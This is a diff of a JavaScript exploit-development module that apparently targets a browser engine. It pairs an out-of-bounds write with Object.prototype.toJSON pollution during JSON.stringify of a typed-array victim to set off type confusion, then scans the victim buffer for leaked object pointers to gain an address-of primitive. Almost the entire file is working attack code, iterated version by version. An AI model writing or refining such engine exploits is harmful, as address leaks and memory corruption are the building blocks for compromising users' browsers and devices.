@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v20_ConfuseReturnedVictimContainer)
+// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v20_TriggerObjectConfusion)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -9,7 +9,7 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC = "OriginalHeisenbug_TypedArrayAddrof_v20_ConfuseReturnedVictimContainer";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC = "OriginalHeisenbug_TypedArrayAddrof_v20_TriggerObjectConfusion";
 
 const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
@@ -18,102 +18,91 @@ const OOB_WRITE_VALUE = 0xFFFFFFFF;
 let object_to_leak_A_v20 = null;
 let object_to_leak_B_v20 = null;
 let victim_typed_array_ref_v20 = null; 
-let returned_container_v20 = null; // Objeto retornado pela Call #1 da sonda
+let underlying_victim_buffer_view_v20 = null; // Float64Array view of the victim's buffer
+let trigger_object_v20 = null; // Objeto que esperamos que seja confuso
 let probe_call_count_v20 = 0;
-let last_probe_details_v20 = null; // Para logging externo simplificado
+let last_confused_trigger_details_v20 = null; 
 
-function toJSON_TA_Probe_ConfuseReturnedVictimContainer() {
+function toJSON_TA_Probe_TriggerObjectConfusion() {
     probe_call_count_v20++;
     const call_num = probe_call_count_v20;
-    let current_call_info = { call: call_num, this_type: Object.prototype.toString.call(this), action: "Init" };
+    const current_this_type = Object.prototype.toString.call(this);
+    logS3(`[TOC_Probe_v20] Call #${call_num}. 'this' type: ${current_this_type}.`, "leak");
 
-    if (call_num === 1) {
-        if (this === victim_typed_array_ref_v20) {
-            current_call_info.action = "Returned container";
-            logS3(`[CRVC_Probe_v20] Call #${call_num}: 'this' is victim. Returning new container.`, "info");
-            returned_container_v20 = { 
-                id_marker: "CRVC_Container_v20",
-                victim_payload: victim_typed_array_ref_v20, 
-                leak_slot_A: null, 
-                leak_slot_B: null,
-            };
-            last_probe_details_v20 = current_call_info;
-            return returned_container_v20;
-        } else {
-            current_call_info.action = "ERROR: Call 1 'this' not victim";
-            logS3(`[CRVC_Probe_v20] Call #${call_num}: ERROR! 'this' is not victim_typed_array_ref_v20. Type: ${current_call_info.this_type}`, "error");
-            last_probe_details_v20 = current_call_info;
-            return { error_call_1_mismatch: true };
-        }
-    } else if (this === returned_container_v20) { 
-        current_call_info.action = "Processing returned_container_v20";
-        logS3(`[CRVC_Probe_v20] Call #${call_num}: 'this' IS returned_container_v20. Type: ${current_call_info.this_type}`, "info");
+    if (call_num === 1 && this === victim_typed_array_ref_v20) {
+        logS3(`[TOC_Probe_v20] Call #${call_num}: 'this' is victim_typed_array_ref_v20. Returning trigger_object_v20.`, "info");
+        trigger_object_v20 = { 
+            id: "trigger_obj_v20",
+            victim_buffer_view: underlying_victim_buffer_view_v20, // Passa a view real do buffer
+            marker_A: null, // Para tentar vazar ponteiros no próprio trigger_object
+            marker_B: null
+        };
+        return trigger_object_v20;
+    } else if (this === trigger_object_v20) { 
+        logS3(`[TOC_Probe_v20] Call #${call_num}: 'this' IS trigger_object_v20. Current type: ${current_this_type}`, "info");
         
-        if (current_call_info.this_type === '[object Object]') {
-            current_call_info.action += " - Confused!";
-            logS3(`[CRVC_Probe_v20] Call #${call_num}: TYPE CONFUSION ON returned_container_v20!`, "vuln");
+        last_confused_trigger_details_v20 = { // Armazena detalhes desta interação
+            call_number: call_num,
+            this_type: current_this_type,
+            trigger_id_match: (this.id === "trigger_obj_v20"),
+            writes_to_victim_buffer_view_attempted: false,
+            writes_to_trigger_object_attempted: false,
+            error: null
+        };
+
+        if (current_this_type === '[object Object]') {
+            logS3(`[TOC_Probe_v20] Call #${call_num}: trigger_object_v20 ('this') is [object Object]. TYPE CONFUSION ON TRIGGER!`, "vuln");
             try {
-                logS3(`   Attempting writes to this.victim_payload[0],[1] & this.leak_slot_A/B`, "warn");
-                if (object_to_leak_A_v20) {
-                    this.victim_payload[0] = object_to_leak_A_v20; // Tenta addrof na vítima real
-                    this.leak_slot_A = object_to_leak_A_v20;         // Tenta vazar no próprio container
-                }
-                if (object_to_leak_B_v20) {
-                    this.victim_payload[1] = object_to_leak_B_v20;
-                    this.leak_slot_B = object_to_leak_B_v20;
-                }
-                current_call_info.action += " - Writes attempted";
-                logS3(`[CRVC_Probe_v20] Call #${call_num}: Writes completed.`, "info");
+                logS3(`[TOC_Probe_v20] Call #${call_num}: Attempting writes via this.victim_buffer_view...`, "warn");
+                if (object_to_leak_A_v20 && this.victim_buffer_view) this.victim_buffer_view[0] = object_to_leak_A_v20;
+                if (object_to_leak_B_v20 && this.victim_buffer_view) this.victim_buffer_view[1] = object_to_leak_B_v20;
+                last_confused_trigger_details_v20.writes_to_victim_buffer_view_attempted = true;
+
+                logS3(`[TOC_Probe_v20] Call #${call_num}: Attempting writes to this.marker_A/B...`, "warn");
+                if (object_to_leak_A_v20) this.marker_A = object_to_leak_A_v20;
+                if (object_to_leak_B_v20) this.marker_B = object_to_leak_B_v20;
+                last_confused_trigger_details_v20.writes_to_trigger_object_attempted = true;
+                logS3(`[TOC_Probe_v20] Call #${call_num}: Writes completed. Keys of 'this' (trigger_object): ${Object.keys(this).join(',')}`, "info");
+
             } catch(e_write) {
-                current_call_info.action += ` - Write ERROR: ${e_write.message}`;
-                logS3(`[CRVC_Probe_v20] Call #${call_num}: ERRO during writes: ${e_write.message}`, "error");
+                last_confused_trigger_details_v20.error = e_write.message;
             }
         } else {
-             current_call_info.action += " - Not [object Object]";
-             logS3(`[CRVC_Probe_v20] Call #${call_num}: returned_container_v20 ('this') is NOT [object Object]. Type: ${current_call_info.this_type}`, "warn");
+            logS3(`[TOC_Probe_v20] Call #${call_num}: trigger_object_v20 ('this') is NOT [object Object]. Type: ${current_this_type}`, "warn");
         }
-        last_probe_details_v20 = current_call_info;
-        return undefined; // Evitar mais processamento deste objeto pela sonda
-    
-    } else if (this === victim_typed_array_ref_v20 && call_num > 1) { // Pode ser chamado para serializar this.victim_payload
-        current_call_info.action = "Processing victim_payload from container";
-        logS3(`[CRVC_Probe_v20] Call #${call_num}: 'this' is victim_typed_array_ref_v20 (likely from victim_payload). Type: ${current_call_info.this_type}`, "info");
-        // Se a vítima em si for confundida aqui, seria interessante.
-        if (current_call_info.this_type === '[object Object]') {
-             logS3(`[CRVC_Probe_v20] Call #${call_num}: VICTIM PAYLOAD ITSELF IS CONFUSED!`, "vuln");
-             // Poderia tentar escritas aqui também se desejado
+        return undefined; // Tenta parar mais recursão neste objeto
+    } else {
+         // Se 'this' for o victim_typed_array_ref_v20 novamente na call #2 (devido ao aninhamento)
+        if (this === victim_typed_array_ref_v20 && call_num > 1) {
+             logS3(`[TOC_Probe_v20] Call #${call_num}: 'this' is victim_typed_array_ref_v20 (again). Type: ${current_this_type}. Returning undefined.`, "info");
+             return undefined;
         }
-        last_probe_details_v20 = current_call_info;
-        return undefined; // Serializar Uint8Array normalmente se não confuso
-    }
-    else {
-        current_call_info.action = "Unexpected 'this'";
-        logS3(`[CRVC_Probe_v20] Call #${call_num}: Unexpected 'this'. Type: ${current_call_info.this_type}. IsVictim? ${this === victim_typed_array_ref_v20}. IsReturnedContainer? ${this === returned_container_v20}`, "warn");
-        last_probe_details_v20 = current_call_details;
-        return { unhandled_this_in_probe: true, call: call_num };
+        logS3(`[TOC_Probe_v20] Call #${call_num}: 'this' is unexpected. Type: ${current_this_type}. Returning undefined.`, "warn");
+        return undefined;
     }
 }
 
 
-export async function executeTypedArrayVictimAddrofTest_ConfuseReturnedVictimContainer() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}.triggerAndLog`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (ConfuseReturnedVictimContainer) & Addrof ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC} Init...`;
+export async function executeTypedArrayVictimAddrofTest_TriggerObjectConfusion() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}.triggerAndLog`;
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TriggerObjectConfusion) & Addrof ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC} Init...`;
 
     probe_call_count_v20 = 0;
     victim_typed_array_ref_v20 = null; 
-    controller_object_v20 = null; // Reset
-    last_probe_details_v20 = null; // Reset
-    object_to_leak_A_v20 = { marker: "ObjA_TA_v20crvc", id: Date.now() }; 
-    object_to_leak_B_v20 = { marker: "ObjB_TA_v20crvc", id: Date.now() + Math.floor(Math.random() * 1000) };
+    underlying_victim_buffer_view_v20 = null;
+    trigger_object_v20 = null;
+    last_confused_trigger_details_v20 = null;
+    object_to_leak_A_v20 = { marker: "ObjA_TA_v20toc", id: Date.now() }; 
+    object_to_leak_B_v20 = { marker: "ObjB_TA_v20toc", id: Date.now() + Math.floor(Math.random() * 1000) };
 
     let errorCapturedMain = null;
-    let stringifyOutput_obj = null; // Para o objeto parseado do stringifyOutput
+    let stringifyOutput = null; 
     
-    let addrof_Victim_A = { success: false, msg: "Addrof Victim[0]: Default" };
-    let addrof_Victim_B = { success: false, msg: "Addrof Victim[1]: Default" };
-    let addrof_Container_A = { success: false, msg: "Addrof Container.leak_slot_A: Default" };
-    let addrof_Container_B = { success: false, msg: "Addrof Container.leak_slot_B: Default" };
+    let addrof_Victim_A = { success: false, msg: "VictimBuf[0]: Default" };
+    let addrof_Victim_B = { success: false, msg: "VictimBuf[1]: Default" };
+    let addrof_Trigger_A = { success: false, msg: "Trigger.marker_A: Default" };
+    let addrof_Trigger_B = { success: false, msg: "Trigger.marker_B: Default" };
 
     const fillPattern = 0.20202020202020;
 
@@ -123,89 +112,86 @@ export async function executeTypedArrayVictimAddrofTest_ConfuseReturnedVictimCon
         logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
         await PAUSE_S3(100);
 
-        victim_typed_array_ref_v20 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
-        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v20.buffer); 
-        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) float64_view_on_underlying_ab[i] = fillPattern + i;
-        logS3(`STEP 2: victim_typed_array_ref_v20 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
+        let underlying_ab = new ArrayBuffer(VICTIM_BUFFER_SIZE);
+        victim_typed_array_ref_v20 = new Uint8Array(underlying_ab); 
+        underlying_victim_buffer_view_v20 = new Float64Array(underlying_ab); 
+        for(let i = 0; i < underlying_victim_buffer_view_v20.length; i++) underlying_victim_buffer_view_v20[i] = fillPattern + i;
+        logS3(`STEP 2: victim_typed_array_ref_v20 and its view created.`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
         let pollutionApplied = false;
 
         try {
-            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ConfuseReturnedVictimContainer, writable: true, configurable: true, enumerable: false });
+            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_TriggerObjectConfusion, writable: true, configurable: true, enumerable: false });
             pollutionApplied = true;
-            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v20); 
-            logS3(`  JSON.stringify completed. Raw Stringify Output (first 200 chars): ${rawStringifyOutput ? rawStringifyOutput.substring(0,200) + "..." : 'N/A'}`, "info", FNAME_CURRENT_TEST);
-            
-            try {
-                if (rawStringifyOutput) stringifyOutput_obj = JSON.parse(rawStringifyOutput);
-            } catch (e_parse) {
-                logS3(`  Error parsing stringifyOutput: ${e_parse.message}`, "warn");
-                stringifyOutput_obj = { error_parsing_stringify_output: rawStringifyOutput };
-            }
+            stringifyOutput = JSON.stringify(victim_typed_array_ref_v20); 
+            logS3(`  JSON.stringify completed. Stringify Output (parsed, if obj): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Details of interaction with trigger_object (if occurred): ${last_confused_trigger_details_v20 ? JSON.stringify(last_confused_trigger_details_v20) : 'N/A (trigger_object not reached or not confused)'}`, "leak", FNAME_CURRENT_TEST);
 
-            logS3(`  Details of LAST probe call: ${last_probe_details_v20 ? JSON.stringify(last_probe_details_v20) : 'N/A (probe might not have been called as expected)'}`, "leak", FNAME_CURRENT_TEST);
-
-            let heisenbugConfirmedOnContainer = false;
-            if (last_probe_details_v20 && last_probe_details_v20.call_number > 1 && 
-                last_probe_details_v20.this_type === "[object Object]" && 
-                (last_probe_details_v20.action && last_probe_details_v20.action.includes("Processing returned_container_v20"))) {
-                heisenbugConfirmedOnContainer = true;
-                logS3(`  HEISENBUG ON RETURNED CONTAINER CONFIRMED! Last probe call details: ${JSON.stringify(last_probe_details_v20)}`, "vuln", FNAME_CURRENT_TEST);
+            let heisenbugConfirmedOnTrigger = false;
+            if (last_confused_trigger_details_v20 && last_confused_trigger_details_v20.this_type === "[object Object]" && last_confused_trigger_details_v20.trigger_id_match) {
+                heisenbugConfirmedOnTrigger = true;
+                logS3(`  HEISENBUG ON trigger_object CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
             } else {
-                logS3(`  ALERT: Heisenbug on returned container NOT confirmed. Last probe call details: ${last_probe_details_v20 ? JSON.stringify(last_probe_details_v20) : 'N/A'}`, "error", FNAME_CURRENT_TEST);
+                logS3(`  ALERT: Heisenbug on trigger_object NOT confirmed.`, "error", FNAME_CURRENT_TEST);
             }
                 
-            logS3("STEP 3: Checking victim buffer for addrof...", "warn", FNAME_CURRENT_TEST);
-            const val_A = float64_view_on_underlying_ab[0];
+            logS3("STEP 3: Checking victim buffer...", "warn", FNAME_CURRENT_TEST);
+            const val_A = underlying_victim_buffer_view_v20[0];
             let temp_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
             if (val_A !== (fillPattern + 0) && val_A !== 0 && (temp_A_int64.high() < 0x00020000 || (temp_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
-                addrof_Victim_A.success = true; addrof_Victim_A.msg = `Possible pointer for ObjA in victim_buffer[0]: ${temp_A_int64.toString(true)}`;
-            } else { addrof_Victim_A.msg = `No pointer for ObjA in victim_buffer[0]. Val: ${val_A}`; }
+                addrof_Victim_A.success = true; addrof_Victim_A.msg = `Possible pointer in victim_buffer_view[0]: ${temp_A_int64.toString(true)}`;
+            } else { addrof_Victim_A.msg = `No pointer in victim_buffer_view[0]. Val: ${val_A}`; }
 
-            const val_B = float64_view_on_underlying_ab[1];
+            const val_B = underlying_victim_buffer_view_v20[1];
             // ... (similar for B)
             let temp_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
             if (val_B !== (fillPattern + 1) && val_B !== 0 && (temp_B_int64.high() < 0x00020000 || (temp_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
-                addrof_Victim_B.success = true; addrof_Victim_B.msg = `Possible pointer for ObjB in victim_buffer[1]: ${temp_B_int64.toString(true)}`;
-            } else { addrof_Victim_B.msg = `No pointer for ObjB in victim_buffer[1]. Val: ${val_B}`; }
+                addrof_Victim_B.success = true; addrof_Victim_B.msg = `Possible pointer in victim_buffer_view[1]: ${temp_B_int64.toString(true)}`;
+            } else { addrof_Victim_B.msg = `No pointer in victim_buffer_view[1]. Val: ${val_B}`; }
 
 
-            logS3("STEP 4: Checking parsed stringifyOutput_obj for leaked container slots...", "warn", FNAME_CURRENT_TEST);
-            if (stringifyOutput_obj && stringifyOutput_obj.id_marker === "CRVC_Container_v20") {
-                 const slot_A_val = stringifyOutput_obj.leak_slot_A;
-                 if (typeof slot_A_val === 'number' && slot_A_val !==0) { // Check if it's a number (potential packed pointer)
-                    let s_slotA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([slot_A_val]).buffer)[0], new Uint32Array(new Float64Array([slot_A_val]).buffer)[1]);
-                    if (s_slotA_int64.high() < 0x00020000 || (s_slotA_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
-                       addrof_Container_A.success = true; addrof_Container_A.msg = `Possible pointer for leak_slot_A in stringifyOutput_obj: ${s_slotA_int64.toString(true)}`;
-                    } else { addrof_Container_A.msg = `stringifyOutput_obj.leak_slot_A is number but not pointer-like: ${slot_A_val}`; }
-                 } else { addrof_Container_A.msg = `stringifyOutput_obj.leak_slot_A not a number or zero. Value: ${slot_A_val}`; }
-
-                 const slot_B_val = stringifyOutput_obj.leak_slot_B;
-                 // ... (similar for slot_B_val)
-                  if (typeof slot_B_val === 'number' && slot_B_val !==0) {
-                    let s_slotB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([slot_B_val]).buffer)[0], new Uint32Array(new Float64Array([slot_B_val]).buffer)[1]);
-                     if (s_slotB_int64.high() < 0x00020000 || (s_slotB_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
-                       addrof_Container_B.success = true; addrof_Container_B.msg = `Possible pointer for leak_slot_B in stringifyOutput_obj: ${s_slotB_int64.toString(true)}`;
-                    } else { addrof_Container_B.msg = `stringifyOutput_obj.leak_slot_B is number but not pointer-like: ${slot_B_val}`; }
-                 } else { addrof_Container_B.msg = `stringifyOutput_obj.leak_slot_B not a number or zero. Value: ${slot_B_val}`; }
-            } else {
-                addrof_Container_A.msg = "stringifyOutput_obj was not the expected container.";
-                addrof_Container_B.msg = "stringifyOutput_obj was not the expected container.";
+            // Check stringifyOutput for leaked markers if it's the trigger_object
+            logS3("STEP 4: Checking stringifyOutput for leaked markers (if it is the trigger_object)...", "warn", FNAME_CURRENT_TEST);
+            let parsedStringifyOutput = null;
+            if (typeof stringifyOutput === 'string') {
+                try { parsedStringifyOutput = JSON.parse(stringifyOutput); } catch (e) { /* ignore */ }
+            } else { // if toJSON returned an object that wasn't further stringified
+                parsedStringifyOutput = stringifyOutput;
             }
 
-            if (addrof_Victim_A.success || addrof_Victim_B.success || addrof_Container_A.success || addrof_Container_B.success) {
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}: Addr? SUCESSO!`;
-            } else if (heisenbugConfirmedOnContainer) {
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}: Heisenbug OK, Addr Fail`;
+            if (parsedStringifyOutput && parsedStringifyOutput.id === "trigger_obj_v20") {
+                if (parsedStringifyOutput.marker_A && typeof parsedStringifyOutput.marker_A === 'number' && parsedStringifyOutput.marker_A !== 0) {
+                    let s_mkrA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([parsedStringifyOutput.marker_A]).buffer)[0], new Uint32Array(new Float64Array([parsedStringifyOutput.marker_A]).buffer)[1]);
+                    if (s_mkrA_int64.high() < 0x00020000 || (s_mkrA_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
+                       addrof_Trigger_A.success = true; addrof_Trigger_A.msg = `Possible pointer for marker_A in stringifyOutput: ${s_mkrA_int64.toString(true)}`;
+                    } else { addrof_Trigger_A.msg = `stringifyOutput.marker_A is number but not pointer-like: ${parsedStringifyOutput.marker_A}`; }
+                } else { addrof_Trigger_A.msg = `stringifyOutput.marker_A not a pointer or not present. Value: ${parsedStringifyOutput.marker_A}`; }
+                 // ... (similar for marker_B)
+                if (parsedStringifyOutput.marker_B && typeof parsedStringifyOutput.marker_B === 'number' && parsedStringifyOutput.marker_B !== 0) {
+                    let s_mkrB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([parsedStringifyOutput.marker_B]).buffer)[0], new Uint32Array(new Float64Array([parsedStringifyOutput.marker_B]).buffer)[1]);
+                    if (s_mkrB_int64.high() < 0x00020000 || (s_mkrB_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
+                       addrof_Trigger_B.success = true; addrof_Trigger_B.msg = `Possible pointer for marker_B in stringifyOutput: ${s_mkrB_int64.toString(true)}`;
+                    } else { addrof_Trigger_B.msg = `stringifyOutput.marker_B is number but not pointer-like: ${parsedStringifyOutput.marker_B}`; }
+                } else { addrof_Trigger_B.msg = `stringifyOutput.marker_B not a pointer or not present. Value: ${parsedStringifyOutput.marker_B}`; }
             } else {
-                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}: Heisenbug Fail?`;
+                 addrof_Trigger_A.msg = "stringifyOutput was not the trigger_object.";
+                 addrof_Trigger_B.msg = "stringifyOutput was not the trigger_object.";
+            }
+
+
+            if (addrof_Victim_A.success || addrof_Victim_B.success || addrof_Trigger_A.success || addrof_Trigger_B.success) {
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}: Addr? SUCESSO!`;
+            } else if (heisenbugConfirmedOnTrigger) {
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}: Heisenbug OK, Addr Fail`;
+            } else {
+                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}: Heisenbug Fail?`;
             }
 
         } catch (e_str) {
             errorCapturedMain = e_str;
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}: Stringify/Addrof ERR`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}: Stringify/Addrof ERR`;
         } finally {
             if (pollutionApplied) {
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
@@ -213,30 +199,29 @@ export async function executeTypedArrayVictimAddrofTest_ConfuseReturnedVictimCon
         }
     } catch (e_outer_main) {
         errorCapturedMain = e_outer_main;
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC} CRITICAL FAIL`;
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC} CRITICAL FAIL`;
     } finally {
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
         logS3(`Total probe calls: ${probe_call_count_v20}`, "info", FNAME_CURRENT_TEST);
-        logS3(`Addrof Victim A: Success=${addrof_Victim_A.success}, Msg='${addrof_Victim_A.msg}'`, addrof_Victim_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
-        logS3(`Addrof Victim B: Success=${addrof_Victim_B.success}, Msg='${addrof_Victim_B.msg}'`, addrof_Victim_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
-        logS3(`Addrof Container A: Success=${addrof_Container_A.success}, Msg='${addrof_Container_A.msg}'`, addrof_Container_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
-        logS3(`Addrof Container B: Success=${addrof_Container_B.success}, Msg='${addrof_Container_B.msg}'`, addrof_Container_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        logS3(`Addrof VictimBuf[0]: Success=${addrof_Victim_A.success}, Msg='${addrof_Victim_A.msg}'`, addrof_Victim_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        logS3(`Addrof VictimBuf[1]: Success=${addrof_Victim_B.success}, Msg='${addrof_Victim_B.msg}'`, addrof_Victim_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        logS3(`Addrof TriggerObj.A: Success=${addrof_Trigger_A.success}, Msg='${addrof_Trigger_A.msg}'`, addrof_Trigger_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        logS3(`Addrof TriggerObj.B: Success=${addrof_Trigger_B.success}, Msg='${addrof_Trigger_B.msg}'`, addrof_Trigger_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
         
         victim_typed_array_ref_v20 = null; 
-        controller_object_v20 = null;
-        last_probe_details_v20 = null;
+        trigger_object_v20 = null;
+        last_confused_trigger_details_v20 = null;
         probe_call_count_v20 = 0;
     }
     return { 
         errorOccurred: errorCapturedMain, 
-        potentiallyCrashed: false, 
-        stringifyResult: stringifyOutput_obj, // Retorna o objeto parseado
-        toJSON_details: last_probe_details_v20, 
+        stringifyResult: stringifyOutput, 
+        toJSON_details: last_confused_trigger_details_v20, 
         total_probe_calls: probe_call_count_v20,
         addrof_victim_A: addrof_Victim_A,
         addrof_victim_B: addrof_Victim_B,
-        addrof_controller_A: addrof_Container_A,
-        addrof_controller_B: addrof_Container_B
+        addrof_controller_A: addrof_Trigger_A, // Renomeado para consistência com o runner
+        addrof_controller_B: addrof_Trigger_B  // Renomeado para consistência com o runner
     };
 }
